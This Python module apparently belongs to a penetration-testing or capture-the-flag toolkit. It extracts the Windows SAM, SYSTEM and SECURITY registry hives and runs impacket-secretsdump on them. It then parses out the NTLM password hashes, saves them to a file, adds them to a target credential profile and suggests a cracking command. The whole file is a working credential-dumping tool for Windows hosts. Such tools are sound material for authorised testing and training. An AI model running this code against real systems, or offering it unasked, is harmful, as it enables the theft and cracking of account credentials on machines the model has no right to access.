import subprocess
from pathlib import Path
from core.runner import run_module_by_name
import zipfile

def run(data, cred, args):
    # --- COLORS ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'


    answer = input(
        "Extract and download Windows hives? [Y/n]: "
    )

    if answer == 'Y' or answer == "y":
        print(answer) 
        run_module_by_name("win.savehives", [], data)
        
        if Path("hives.zip").exists():

            print(
                f"\n{B}[{W}{G}*{W}{B}]{W} Extracting hives.zip\n"
            )

            with zipfile.ZipFile("hives.zip") as z:
                z.extractall(".")




    required = ["SAM", "SYSTEM", "SECURITY"]
    missing = [f for f in required if not Path(f).exists()]

    if missing:
        print(f"\n{R}[!] {W}{BOLD}MISSING HIVES{W}")
        for hive in missing:
            print(f"{B}  └── {hive}")
        return

    


    
    print(f"\n{B}┌── {BOLD}MODULE: OFFLINE HIVE DUMP{W}{B} ────────────────────┐{W}")
    print(f"{B}│{W}  {B}SAM:{W}       {'FOUND':<36}{B}│{W}")
    print(f"{B}│{W}  {B}SYSTEM:{W}    {'FOUND':<36}{B}│{W}")
    print(f"{B}│{W}  {B}SECURITY:{W}  {'FOUND':<36}{B}│{W}")
    print(f"{B}└─────────────────────────────────────────────────┘{W}")


    cmd = [
        "impacket-secretsdump",
        "-sam", "SAM",
        "-system", "SYSTEM",
        "-security", "SECURITY",
        "LOCAL"
    ]
    print(
        f"\n{B}[*]{W} COMMAND\n"
    )

    print(f"{Y}{' '.join(cmd)}{W}")
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print(f"{R}[!] secretsdump failed{W}")
        print(result.stderr)
        return

    print(result.stdout)

    output_file = Path("secretsdump.txt")
    output_file.write_text(result.stdout)

    print(f"\n{G}[+] Output saved:{W} {output_file.resolve()}\n")

# =========================================================
# PARSE NTLM HASHES
# =========================================================
    import argparse
    from core.target import target_add_cred

    EMPTY_NTLM = (
        "31d6cfe0d16ae931b73c59d7e0c089c0"
    )

    recovered = []

    for line in result.stdout.splitlines():

        if ":::" not in line:
            continue

        parts = line.strip().split(":")

        if len(parts) < 4:
            continue

        username = parts[0].strip()
        nthash = parts[3].strip()

        if not nthash:
            continue

        if nthash.lower() == EMPTY_NTLM:
            continue

        recovered.append(
            {
                "user": username,
                "hash": nthash
            }
        )

    # =========================================================
    # SAVE HASH FILE
    # =========================================================

    hash_file = Path("ntlm_hashes.txt")

    hash_file.write_text(
        "\n".join(
            x["hash"]
            for x in recovered
        )
    )

    # =========================================================
    # SHOW RESULTS
    # =========================================================

    if recovered:

        print(
            f"\n{G}[+] {W}Recovered "
            f"{C}{len(recovered)}{W} NTLM hash(es)\n"
        )

        for entry in recovered:

            print(
                f"  {B}├──{W} "
                f"{C}{entry['user']}{W} "
                f"{Y}{entry['hash']}{W}"
            )

        print()

        print(
            f"{G}[+] {W}Hashes Saved"
        )

        print(
            f"{B}  └── {C}{hash_file.resolve()}{W}\n"
        )

    # =========================================================
    # SAVE TO TARGET PROFILE
    # =========================================================

    new_hashes = 0

    for entry in recovered:

        try:

            target_add_cred(
                argparse.Namespace(
                    user=entry["user"],
                    password=None,
                    hash=entry["hash"],
                    aes=None,
                    ccache=None,
                    show=False
                )
            )

            new_hashes += 1

        except Exception:
            pass

    print(
        f"{G}[+] {W}Added "
        f"{C}{new_hashes}{W} hash(es) "
        f"to target profile\n"
    )

    # =========================================================
    # TIP
    # =========================================================

    if recovered:

        print(
            f"{Y}[!]{W} Tip\n"
        )

        print(
            f"  {B}└── {C}ctf crack.hash "
            f"{hash_file.resolve()} "
            f"--mode NTLM{W}\n"
        )